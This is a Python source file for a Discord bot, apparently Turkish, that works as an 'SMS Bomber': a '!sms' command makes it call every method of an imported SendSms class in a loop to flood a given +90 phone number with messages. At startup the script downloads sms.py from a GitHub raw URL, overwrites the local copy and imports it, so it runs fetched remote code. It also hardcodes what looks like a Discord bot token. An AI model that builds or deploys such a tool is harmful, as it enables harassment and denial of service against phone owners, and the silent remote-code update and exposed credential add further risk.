import discord
import asyncio
from time import sleep
from requests import get
r = get("https://raw.githubusercontent.com/keshxrd/sms.py/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print("Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms

TOKEN = "MTA0MTY0Mjk3MTExMzczNDE0NA.GhcKEd.rKj2RZzz3sJ-bAPPRZHvbCgmPJ94FV3GaWz4Bs"
gif = ""
adet = 2837429834728347298347298347298347238
saniye = 0

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} Çalışmaya Başladı!'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.playing, name="Made BY Ker3m#0030")
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == "!sms":
        if len(message.content.split(" ")[1]) == 10:
            telno = message.content.split(" ")[1]
            embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff,)
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi. \nBot durumu | **Boşta** {message.author.mention}")                        
        else:
            await message.channel.send(f"Geçerli komut yazınız!\nYardım için ' !help ' yazınız. {message.author.mention}")
    elif "!help" == message.content:
        await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```!sms 5051234567(başına +90 koymayın.) {message.author.mention}")
    else:
        pass
  
client.run(TOKEN)